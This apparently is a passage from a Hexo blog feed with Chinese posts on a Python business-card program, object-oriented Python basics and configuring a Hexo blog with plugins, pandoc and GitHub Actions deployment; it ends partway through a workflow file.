id="无限循环">无限循环</h4><ul><li>在开发软件时，如果 <strong>不希望程序执行后</strong> 立即退出</li><li>可以在程序中增加一个 <strong>无限循环</strong></li><li><strong>由用户来决定</strong> 退出程序的时机</li></ul><h4 id="todo-注释">TODO 注释</h4><ul><li>PyCharm 中，在 <code>#</code> 后跟上<code>TODO</code>，用于标记需要去做的工作。 点击 PyCharm左下角的小窗口图标，便可以知道哪些 TODO，并跳转。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TODO(作者/邮件) 显示系统菜单</span></span><br></pre></td></tr></table></figure><h2 id="保存名片数据的结构">02. 保存名片数据的结构</h2><p><strong>程序就是用来处理数据的，而变量就是用来存储数据的</strong></p><ul><li>确定数据的存储结构，是搭建框架后要做的重要事情之一。</li><li>使用 <strong>字典</strong> 记录 <strong>每一张名片</strong>的详细信息</li><li>使用 <strong>列表</strong> 统一记录所有的<strong>名片字典</strong></li></ul><p><strong>注意</strong></p><ol type="1"><li><strong>如果所有相关操作</strong>，都需要使用这个数据，那它应该<strong>定义在程序的顶部</strong></li><li><strong>程序刚运行时，没有数据</strong>，所以是<strong>空列表</strong></li></ol><p><strong>注意</strong></p><ul><li>在函数中使用 <code>return</code> 表示返回</li><li>如果在 <code>return</code>后没有跟任何内容，只是表示该函数执行到此就不再执行后续的代码</li><li>要删除名片记录，只需要把列表中对应的字典删除即可</li><li>要修改名片记录，只需要把列表中对应的字典中每一个键值对的数据修改即可</li><li><strong>如果用户在使用时，某些名片内容并不想修改</strong>，应该如何做呢？——既然系统提供的 <code>input</code> 函数不能满足需求，那么就新定义一个函数<code>input_card_info</code> 对系统的 <code>input</code>函数进行扩展</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input_card_info</span>(<span class="params">dict_value, tip_message</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;输入名片信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dict_value: 字典原有值</span></span><br><span class="line"><span class="string">    :param tip_message: 输入提示信息</span></span><br><span class="line"><span class="string">    :return: 如果输入，返回输入内容，否则返回字典原有值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 提示用户输入内容</span></span><br><span class="line">    result_str = <span class="built_in">input</span>(tip_message)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 针对用户的输入进行判断，如果用户输入了内容，直接返回结果</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result_str) &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result_str</span><br><span class="line">    <span class="comment"># 3. 如果用户没有输入内容，返回 `字典中原有的值`</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dict_value</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文档注释">文档注释</h2><p>在完成函数的功能之后，添加注释，以便别人或者自己以后阅读。</p><h2 id="linux-上的-shebang-符号">07. LINUX 上的 <code>Shebang</code>符号(<code>#!</code>)</h2><ul><li><code>#!</code>这个符号叫做 <code>Shebang</code> 或者<code>Sha-bang</code></li><li><code>Shebang</code> 通常在 <code>Unix</code> 系统脚本的中<strong>第一行开头</strong> 使用</li><li>指明 <strong>执行这个脚本文件</strong> 的<strong>解释程序</strong></li></ul><h3 id="使用-shebang-的步骤">使用 Shebang 的步骤</h3><ul><li><ol type="1"><li>使用 <code>which</code> 查询 <code>python3</code>解释器所在路径</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> python3</span><br></pre></td></tr></table></figure><ul><li><ol start="2" type="1"><li>修改要运行的 <strong>主 python文件</strong>，在第一行增加以下内容</li></ol></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br></pre></td></tr></table></figure><ul><li><ol start="3" type="1"><li>修改 <strong>主 python 文件</strong> 的文件权限，增加执行权限</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x cards_main.py</span><br></pre></td></tr></table></figure><ul><li><ol start="4" type="1"><li>在需要时执行程序即可</li></ol></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cards_main.py</span><br></pre></td></tr></table></figure><p>推荐: <a href="https://zhuanlan.zhihu.com/p/84292970">EffectivePython 用 pythonic 方式来思考</a> <ahref="https://zh.wikipedia.org/wiki/Shebang">Shebang wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Object-oriented Python</title>
      <link href="/blog/2020/03/21/programming/python/2.object-oriented/01.oo_basic/"/>
      <url>/blog/2020/03/21/programming/python/2.object-oriented/01.oo_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>三要素</p><ol type="1"><li><p>类名 这类事物的名字，<strong>满足大驼峰命名法</strong>大驼峰命名法</p><ol type="1"><li>每个单词的首字母大写, 如: <code>StudentAge</code></li><li>单词与单词之间没有下划线 <ahref="https://blog.csdn.net/jerry11112/article/details/84985026">大驼峰命名法和小驼峰命名法</a></li></ol></li><li><p>属性 这类事物具有什么样的特征</p></li><li><p>方法 这类事物具有什么样的行为</p></li></ol><h2 id="三要素的确定">三要素的确定</h2><ol type="1"><li>类名的确定 <strong>名词提炼法</strong>分析<strong>整个业务流程</strong>，出现的<strong>名词</strong>，通常就是找到的类。</li><li>属性的确定对<strong>对象的特征描述</strong>，通常可以定义成属性</li><li>方法的确定<strong>对象具有的行为</strong>（动词），通常可以定义成<strong>方法</strong></li></ol><blockquote><p>提示：需求中没有涉及的属性或者方法在设计类时，不需要考虑</p></blockquote><h2 id="面向对象三大特性">面向对象三大特性</h2><p>面向对象三大特性</p><ol type="1"><li><p>封装：根据职责将属性和方法封装到一个抽象的类中</p><ul><li>定义类的准则</li></ul></li><li><p>继承：实现代码的重用，相同的代码不需要重复的编写</p><ul><li>设计类的技巧</li><li>子类针对自己特有的需求，编写特定的代码</li></ul></li><li><p>多态：不同的<strong>子类对象</strong>调用相同的<strong>父类方法</strong>，产生不同的执行结果</p><ul><li><strong>多态</strong>可以<strong>增加代码的灵活度</strong></li><li>以<strong>继承</strong>和<strong>重写父类方法</strong>为前提</li><li>是调用方法的技巧，<strong>不会影响到类的内部设计</strong></li></ul></li></ol><h2 id="定义简单的类">定义简单的类</h2><p>方法的定义格式和之前学习过的函数几乎一样</p><p>区别在于第一个参数必须是 <code>self</code>，大家暂时先记住，稍后介绍<code>self</code></p><p>注意：类名的命名规则要符合大驼峰命名法</p><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;这是一个猫类&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;小猫爱吃鱼&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;小猫在喝水&quot;</span>)</span><br><span class="line"></span><br><span class="line">tom = Cat()</span><br><span class="line">tom.drink()</span><br><span class="line">tom.eat()</span><br></pre></td></tr></table></figure><p>引用概念的强调 :在面向对象开发中，引用的概念是同样适用的</p><ul><li><p>在 Python 中使用类创建对象之后，tom变量中仍然记录的是对象在内存中的地址</p></li><li><p>也就是 tom 变量引用了新建的猫对象</p></li><li><p>使用 print输出对象变量，默认情况下，是能够输出这个变量引用的对象是由哪一个类创建的对象，以及在内存中的地址（十六进制表示）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="built_in">id</span>(object1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span> % addr) <span class="comment"># %x 16 进制</span></span><br><span class="line"></span><br><span class="line">或者直接</span><br><span class="line"><span class="built_in">print</span>(object1)</span><br></pre></td></tr></table></figure></li></ul><h2 id="给对象增加属性">给对象增加属性</h2><p>在 Python 中，要给对象增加属性，非常的容易，但是不推荐使用</p><ul><li>因为：对象属性的封装应该封装在类的内部</li></ul><p>只需要在类的外部的代码中直接通过，设置一个属性即可</p><blockquote><ul><li><p>在日常开发中，不推荐在类的外部给对象增加属性</p><ul><li>如果在运行时，没有找到属性，程序会报错</li></ul></li><li><p>对象应该包含有哪些属性，应该<strong>封装在类的内部</strong></p></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>:</span><br><span class="line">...</span><br><span class="line">tom = Cat()</span><br><span class="line">tom.name=<span class="string">&#x27;Tom&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="self">self</h2><p>self 是调用方法的对象的引用， 由哪一个对象调用的方法，方法内的 self就是哪一个对象的引用</p><ul><li><p>在类封装的方法内部，self 就表示当前调用方法的对象自己</p></li><li><p>调用方法时，程序员不需要传递 self 参数</p></li><li><p>在方法内部（定义方法时， self 作为第一个参数，否则就不能通过<code>self.</code> 访问对象的方法了）</p><ul><li><p>通过 <code>self.</code>访问对象的属性</p></li><li><p>通过 <code>self.</code>调用对象其他的方法</p></li></ul></li></ul><h2 id="内置方法和属性">内置方法和属性</h2><h3 id="dir-查看属性方法">dir 查看属性、方法</h3><p>在 Python中<strong>对象几乎是无所不在的</strong>，我们之前学习的变量、数据、函数都是对象在Python 中可以使用以下两个方法验证</p><p>The <em>dir</em>() method tries to return a list of valid attributesof the object.</p><ol type="1"><li><p>在<strong>标识符/数据</strong>后输入一个<code>,</code>,然后按下<code>TAB</code> 键，<code>ipython</code>会提示该对象能够调用的方法列表</p></li><li><p>使用内置函数<code>dir</code>传入标识符/数据,可以查看对象内的所有属性及方法</p></li></ol><p>提示: <code>__方法名__</code> 格式的方法是 <code>Python</code>提供的<strong>内置方法/属性</strong>,稍后会给大家介绍一些常用的<code>内置方法/属性</code></p><p><code>__doc__</code> 属性返回对象/函数的注释（三引号包围的注释）</p><table><thead><tr class="header"><th>序号</th><th>方法名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr class="odd"><td>01</td><td><code>__new__</code></td><td>方法</td><td>创建对象时，会被自动调用</td></tr><tr class="even"><td>02</td><td><code>__init__</code></td><td>方法</td><td>对象被初始化时，会被自动调用</td></tr><tr class="odd"><td>03</td><td><code>__del__</code></td><td>方法</td><td>对象被从内存中销毁前，会被自动调用</td></tr><tr class="even"><td>04</td><td><code>__str__</code></td><td>方法</td><td>返回对象的描述信息，print l 函数输出使用</td></tr></tbody></table><p>当使用<code>类名( )</code> 创建对象时，会自动执行以下操作</p><ol type="1"><li>为对象在内存中<strong>分配空间</strong> — 创建对象(create, 使用<code>__new__()</code> 方法)</li><li>为对象的属性<strong>设置初始值</strong> — 初始化方法（init，使用<code>__init__()</code> 方法)</li></ol><p>其中<code>__new__</code>与<code>__init__</code>的作用相当于 C++中的构造函数，<code>__del__</code> 相当于析构函数。</p><h3 id="new__"><code>__new__</code></h3><p><strong>new</strong> is static class method,</p><p>Use <strong>new</strong> when you need to control the creation of anew instance.</p><p><strong>new</strong> is the first step of instance creation. It'scalled first, and is responsible for returning a new instance of yourclass.</p><h3 id="init__"><code>__init__</code></h3><p><strong>init</strong> is instance method, <strong>new</strong> has tocreate the instance first, so <strong>init</strong> can initializeit.</p><p>Use <strong>init</strong> when you need to control initialization ofa new instance.</p><p><strong>init</strong> doesn't return anything; it's only responsiblefor initializing the instance after it's been created.</p><p>Note that <strong>init</strong> takes self as parameter. Until youcreate instance there is no self.</p><ul><li><p><code>__init__</code>是对象的内置方法，专门用来定义一个类具有哪些属性</p></li><li><p>在 <code>__init__</code> 方法内部使用<code>self.属性名=属性的初始值</code> 就可以定义属性</p></li><li><p>定义属性之后，再使用 Cat 类创建的对象，都会拥有该属性</p></li></ul><p>在开发中，如果希望在创建对象的同时，就设置对象的属性，可以对<code>__init__</code> 方法进行改造</p><ol type="1"><li>把希望设置的属性值，定义成 <code>__init__</code> 方法的参数</li><li>在方法内部使用 <code>self.属性=形参</code> 接收外部传递的参数</li><li>在创建对象时，使用<code>类名（属性 1. 属性 2, ...）</code> 调用</li></ol><h3 id="del__"><code>__del__</code></h3><ul><li><p>在 Python 中</p><ul><li>当使用 <code>类名()</code>创建对象时，为对象<code>分配完空间</code>后，<code>自动</code>调用<code>__init__</code>方法</li><li>当一个<code>对象被从内存中销毁</code> 前，会自动调用<code>__del__</code> 方法</li></ul></li><li><p>应用场景</p><p>o <code>__init__</code>改造初始化方法，可以让创建对象更加灵活</p><p>o<code>__del__</code>如果希望在对象被销毁前，再做一些事情，可以考虑一下<code>__del__</code>方法</p></li></ul><h3 id="str__"><code>__str__</code></h3><p><code>__str__</code> 方法自定义变量信息，注意该方法必须返回一个字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        return string</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;this is a class for test!&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  tom = Cat()</span><br><span class="line">  <span class="built_in">print</span>(tom)</span><br><span class="line"></span><br><span class="line">  output:</span><br><span class="line">  this <span class="keyword">is</span> a <span class="keyword">class</span> <span class="title class_">for</span> test!</span><br></pre></td></tr></table></figure><h2 id="生命周期">生命周期</h2><ol type="1"><li><p>调用 <code>类名（）</code>后 , 自动调用类的<code>__new__()</code> 方法，创建对象，生命周期开始</p></li><li><p>自动调用 <code>__init__()</code>方法进行初始化(初始化属性等)</p></li><li><p>在对象的生命周期内，可以访问对象属性，或者让对象调用方法</p></li><li><p>局部变量（局部对象）的生命周期就是在函数内，函数执行完，自动调用<code>__del__</code> ，全局变量的生命周期是全局，程序运行结束，自动调用<code>__del__</code></p></li><li><p>一个对象的 <code>__del__</code>方法一旦被调用，生命周期结束</p></li></ol><h2 id="封装">封装</h2><ol type="1"><li>封装是面向对象编程的一大特点</li><li>面向对象编程的第一步一-将属性和方法封装到一个抽象的类中</li><li>外界使用类创建对象，然后让对象调用方法</li><li>对象方法的细节都被封装在类的内部</li></ol><p>定义没有初始值的属性</p><p>在定义属性时，如果不知道设置什么初始值，可以设置为 None</p><ul><li><p>None 关键字表示什么都没有</p></li><li><p>表示一个空对象，没有方法和属性，是一个特殊的常量</p></li><li><p>可以将 None 值给任何一个变量</p></li></ul><h2 id="条件判断">条件判断</h2><p>当一个对象想要执行一个方法时，需要首先判断它有没有满足执行该方法的条件。</p><h2 id="身份运算符">身份运算符</h2><p>身份运算符用于比较两个对象的内存地址是否一致，即：是否是对同一个对象的引用</p><ul><li>在 Python 中针对 None 比较时，建议使用 <code>is</code>判断运算符描述实例</li></ul><table><colgroup><col style="width: 7%" /><col style="width: 51%" /><col style="width: 40%" /></colgroup><thead><tr class="header"><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr class="odd"><td>is</td><td>is 是判断两个标识符是不是引用同一个对象</td><td>x is y， 类似 id (x) = id(y)</td></tr><tr class="even"><td>is not</td><td>is not 是判断两个标识符是不是引用不同对象</td><td>x is not y, 类似 id (x)！= id(y)</td></tr></tbody></table><p>is xisy，类似 is not： X Is not y，类似 ida) l=id ()</p><p>is 用于判断两个变量引用对象是否为同一个（即：内存地址是否一致）</p><p>== 用于判断引用变量的<strong>值</strong>是否相等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: a</span><br><span class="line">Out[<span class="number">6</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: <span class="built_in">id</span>(a)</span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">4512288848</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="built_in">id</span>(b)</span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">4514154608</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: a == b</span><br><span class="line">Out[<span class="number">10</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: a <span class="keyword">is</span> b</span><br><span class="line">Out[<span class="number">11</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: a <span class="keyword">is</span> <span class="keyword">not</span> b</span><br><span class="line">Out[<span class="number">12</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="私有属性和私有方法">私有属性和私有方法</h2><h3 id="应用场景及定义方式">应用场景及定义方式</h3><p>应用场景</p><ul><li><p>在实际开发中，<strong>对象</strong>的<strong>某些属性或方法</strong>可能只希望<strong>在对象的内部被使用</strong>，而<strong>不希望在外部被访问到</strong></p></li><li><p><strong>私有属性</strong>就是<strong>对象</strong>不希望公开的<strong>属性</strong></p></li><li><p><strong>私有方法</strong>就是<strong>对象</strong>不希望公开的<strong>方法</strong></p></li></ul><p>定义方式</p><ul><li>在<strong>定义属性或方法时</strong>，在<strong>属性名或者方法名前</strong>增加<strong>两个下划线</strong>，定义的就是<strong>私有</strong>属性或方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Women</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__secret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s age is <span class="subst">&#123;self.__age&#125;</span>&quot;</span>)</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><h2 id="伪私有属性和私有方法">伪私有属性和私有方法</h2><p>提示：在日常开发中，<strong>不要使用这种方式、访问对象的私有属性或私有方法</strong></p><p>Python 中，并没有<strong>真正意义</strong>的<strong>私有</strong></p><p>在给<strong>属性、方法</strong>命名时，实际是对<strong>名称</strong>做了一些特殊处理，使得外界无法访问到</p><p>处理方式：在<strong>名称</strong>前面加上<code>_类名-&gt;_类名__名称</code>,即: <code>[单下划线][类名][双下划线][名称]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(xiaofang._Women__age)</span><br><span class="line">xiaofang._Women__secret()</span><br></pre></td></tr></table></figure><h2 id="补充">补充</h2><p>id( object )</p><blockquote><p>Return the identity of an object.</p><p>This is guaranteed to be unique among simultaneously existingobjects. (CPython uses the object's memory address.)</p></blockquote><p>del</p><blockquote><p>The <code>del</code> keyword is used to delete objects. In Pythoneverything is an object, so the <code>del</code> keyword can also beused to delete variables, lists, or parts of a list etc.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: li=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="keyword">del</span> li[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: li</span><br><span class="line">Out[<span class="number">12</span>]: [<span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="keyword">del</span> li</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: li</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">14</span>-3fab4c9c2cf3&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> li</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;li&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>print</p><p>使用 * 表示重复输出多次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure><p>一个对象的属性可以是另外一个类创建的对象</p><p>参考资料: <ahref="https://stackoverflow.com/questions/674304/why-is-init-always-called-after-new">Whyis <code>__init__()</code> always called after<code>__new__()</code>?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo 博客配置</title>
      <link href="/blog/2020/03/15/misc/hexo_config/"/>
      <url>/blog/2020/03/15/misc/hexo_config/</url>
      
        <content type="html"><![CDATA[<h2 id="maupassant-hexo-with-github-action">maupassant-hexo with githubaction</h2><p>照着教程来：<ahref="https://www.haomwei.com/technology/maupassant-hexo.html">大道至简——Hexo简洁主题推荐 | 屠·城</a></p><h3 id="博客配置注意">博客配置注意</h3><ol type="1"><li><p>self_search</p><ol type="1"><li>set <code>self_search: true</code> in maupassant<code>__config.yml</code></li><li><code>npm instal hexo-generator-search --save</code></li></ol></li><li><p>word counter</p><ol type="1"><li>set <code>wordcount: true</code> in maupassant<code>__config.yml</code></li><li><code>npm install hexo-wordcount --save</code></li></ol><p>If you want to display the word counter and the reading time expectedto spend of each post please set the value to true, and you must havehexo-wordcount installed.</p></li><li><p>add sitemap for spider</p><ol type="1"><li><p><code>npm install hexo-generator-sitemap --save</code></p></li><li><p>add the following line to hexo <code>__config.yml</code></p></li></ol><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line">sitemap:</span><br><span class="line">    path: sitemap.xml</span><br></pre></td></tr></table></figure></p></li><li><p>增加 google analysis Universal Analytics property 的 id 是<code>UA-xxx</code>, 而 Google Analytics 4 的 id 是 <code>G-xx</code>Universal Analytics property 已经被 Google Analytics 4更新迭代替换了。</p></li><li><p>提交 google search 收录</p><p>打开<code>https://search.google.com/search-console</code>，因为本次部署并未使用自定义域名，github page 也没有 DNS 可以额外设置，因此选择 URL 验证：</p><ol type="1"><li><p><code>https://realyee.github.io/</code></p><p>选择 HTML 文件下载方式，然后将 HTML 问价放到 hexo 根目录的 source文件夹中，并在该 HTML 文件开头加上以下四行，防止 hexo 渲染。</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: false</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p><code>https://realyee.github.io/blog/</code></p><p>之前添加过 google analysis， maupassant 主题在网页加入了 gtag之类的，直接验证成功，然后提交 sitemap 即可。</p></li></ol></li><li><p>任意一个 github 仓库都可以开启 github pages功能，可以考虑将学术主页部署在 github page 主页，将博客部署在 blog项中</p><p>搭建 hexo-theme-academia 主题学术主页, 在 hexo 的<code>__config.yml</code> 中的 index_generator 的 path 加上<code>/home</code> 来展示主页,然后在 <code>source</code> 目录下创建<code>home/index.md</code>, 注意要在其 front-matter 中加入<code>permalink: index.html</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index_generator:</span><br><span class="line">path: &quot;/home&quot;</span><br><span class="line">per_page: 10</span><br><span class="line">order_by: -date</span><br></pre></td></tr></table></figure></p><p>这样的话，自己一些 web 项目也可以开启 Github page映射到网络上来。</p></li><li><p>使用 git 部署 在两个 hexo 仓库目录下都执行<code>npm install --save hexo-deployer-git</code></p></li><li><p>mathjax 渲染多行公式失败，使用 pandoc 正确渲染多行 MathJax公式</p><p>Hexo 官方的默认渲染插件 hexo-theme-marked虽然能满足大部分渲染要求，但也存在着以下不足（针对 v4.0.0 版本）：</p><ul><li>不支持 Github-Flavoured-Markdown 的表情：😄</li><li>不支持上下脚标</li><li>脚注不支持</li><li>目录[TOC]不被支持</li><li>不支持 MathJax 数学公式换行</li></ul><p>卸载 Hexo默认渲染插件：<code>npm uninstall hexo-renderer-marked --save</code>安装 pandoc渲染插件：<code>npm install hexo-renderer-pandoc --save</code>注意：需要安装 pandoc，否则会报错</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-1-amd64.deb</span><br><span class="line">sudo dpkg -i pandoc-3.1.6-1-amd64.deb</span><br></pre></td></tr></table></figure></p><p>另一款针对 hexo 的 markdown 渲染器（math方面插件支持）：hexo-renderer-markdown-it，先试着上面的 pandoc不行再试这个，😄。</p></li></ol><h2 id="github-action-自动化部署">Github action 自动化部署</h2><p>效果：只需要 commit 源文件，Github action自动化便会自动部署更新网页。</p><p>首先，重述一下我的博客与仓库：realyee.github.io仓库作为学术主页，开启 page 服务；blog 仓库作为博客主页，开启 page服务，目录为 realyee.github.io/blog。新建 academic_source，blog_source私人仓库分别对应于 realyee.github.io 仓库与 blog仓库，存储对应的源文件。</p><p>首先,在搭建好原博客的情况下,进行下面步骤（以 academic_source为例）</p><ol type="1"><li><p>在 theme 的主题目录下删除 <code>.git</code>目录：<code>rm -rf theme/academia/.git</code></p></li><li><p>在 github 网页上 fork 所使用的主题仓库，并在网页端新建空仓库<code>academic_source</code></p></li><li><p>在 hexo 博客根目录下，创建如下目录文件<code>.github/workflows/autodeploy.yml</code>(最后的文件名随意写，只要是 yaml 格式就行) 填入一下内容，并对应修改:</p><p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 